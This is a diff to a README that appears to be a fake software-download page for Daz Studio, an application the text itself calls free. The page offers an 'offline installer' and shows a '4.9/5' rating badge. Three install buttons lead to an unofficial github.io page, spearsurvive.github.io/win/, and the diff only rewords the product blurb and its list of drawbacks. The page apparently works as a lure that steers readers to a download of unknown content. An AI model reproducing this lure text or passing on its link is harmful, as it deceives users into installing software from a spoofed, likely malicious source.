@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-3D+Character-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-3D+Character+Animation-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Daz Studio Free Installer** — Daz Studio is a free 3D character posing, animation, and scene composition application. Works without internet access, no account required. Full offline installation.
+**💻 Daz Studio Free Installer** — Daz Studio is a free 3D figure design and animation application from Daz Productions. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Daz Studio](https://img.shields.io/badge/⬇_Install_Daz%20Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Daz Studio](https://img.shields.io/badge/⬇_Install_Daz+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Daz Studio
 
-Daz Studio is a free 3D character posing, animation, and scene composition application. Using Daz's library of photorealistic human figures, clothing, and environments, it enables artists to create professional-quality character renders without traditional 3D modeling skills.
+Daz Studio is a free 3D figure design and animation application from Daz Productions. Create photorealistic renders and animations using a vast library of human figures, clothing, hair, props, and environments. The Genesis figure system allows precise character customization through morphs and poses. Daz Studio is widely used for character illustration, comics, novel cover art, and short film production.
 
 ---
 
 ## ❌ Problem: Daz Studio is hard to access
 
-- **Content Store Dependency** — Best content requires purchasing from Daz's store; costs add up
-- **Heavy File Sizes** — High-quality Daz content requires significant storage
-- **Windows and macOS Only** — No Linux version available
-- **Steep Render Times** — Photorealistic IRAY rendering requires powerful GPU and takes significant time
+- **Content Ecosystem Cost** — Base software is free; quality content requires significant purchases
+- **Hardware Demands** — GPU rendering requires a capable NVIDIA GPU for best performance
+- **Learning Curve** — Content management and render settings take time to master
+- **IRAY Performance** — CPU rendering significantly slower than GPU; requires compatible hardware
 
 ---
 
@@ -81,7 +81,7 @@ Daz Studio is a free 3D character posing, animation, and scene composition appli
 
 <div align="center">
 
-[![⬇ Install Daz Studio](https://img.shields.io/badge/⬇_Install_Daz%20Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Daz Studio](https://img.shields.io/badge/⬇_Install_Daz+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Daz Studio is a free 3D character posing, animation, and scene composition appli
 
 ---
 
-**Daz Studio Free Installer** — Daz Studio is a free 3D character posing, animation, and scene composition application. Install without internet connection today!
+**Daz Studio Free Installer** — Daz Studio is a free 3D figure design and animation application from Daz Productions. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Daz Studio](https://img.shields.io/badge/⬇_Install_Daz%20Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Daz Studio](https://img.shields.io/badge/⬇_Install_Daz+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
